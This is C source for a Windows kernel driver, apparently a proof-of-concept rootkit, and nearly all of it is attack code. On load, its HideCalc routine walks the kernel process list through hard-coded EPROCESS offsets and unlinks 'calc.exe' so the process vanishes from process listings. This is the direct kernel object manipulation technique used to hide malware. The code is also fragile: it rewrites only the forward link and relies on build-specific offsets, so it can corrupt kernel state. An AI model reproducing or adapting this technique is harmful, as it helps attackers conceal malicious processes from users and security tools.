#include <ntifs.h>
#include <ntddk.h>
#define DeviceName L"\\Device\\driver"
#define LnkDeviceName L"\\DosDevices\\driver" 


VOID HideCalc() {
	PEPROCESS cur_proc, next_proc, proc_bis, after_next_proc;
	PLIST_ENTRY cur_list, next_list, list_bis, after_next_list;
	UCHAR target[8], name[8];
	INT i;
	
	strncpy(target, "calc.exe", 8);
	
	cur_proc = IoGetCurrentProcess();
	cur_list = (PLIST_ENTRY) ((PUCHAR)cur_proc + 0x0b8);
	
	DbgPrint("Eprocess depart %x: \n", cur_proc);
	DbgPrint("Name Cur: %s\n", (PUCHAR)cur_proc + 0x16c);
	
	next_list = (PLIST_ENTRY) (cur_list->Flink);
	next_proc = (PEPROCESS) ((PUCHAR)next_list - 0x0b8);
	
	DbgPrint("Next Eprocess depart %x: \n", next_proc);
	DbgPrint("Name Next: %s\n", (PUCHAR)next_proc + 0x16c);
	
	for (i=0; i<100; i++) {
		//if (i%10==0) {
		//	DbgPrint("Now %d\n", i);
		//}
		cur_proc = next_proc;
		cur_list = next_list;
		cur_list = (PLIST_ENTRY) ((PUCHAR)cur_proc + 0x0b8);
		next_list = (PLIST_ENTRY) (cur_list->Flink);
		next_proc = (PEPROCESS) ((PUCHAR)next_list - 0x0b8);
		//DbgPrint("Next Eprocess depart %x: \n", next_proc);
		//DbgPrint("Name Next: %s\n", (PUCHAR)next_proc + 0x16c);
		strncpy(name, (PUCHAR)next_proc + 0x16c, 8);
		if (strncmp(name, target, 8)==0) {
			//DbgPrint("Found: %s\n", name);
			after_next_list = (PLIST_ENTRY) (next_list->Flink);
			after_next_proc = (PEPROCESS) ((PUCHAR)after_next_list - 0x0b8);
			cur_list->Flink = (PLIST_ENTRY) after_next_list;
		}
	}
}


NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	HideCalc();
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;
	
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;
	
	return STATUS_SUCCESS;	
}

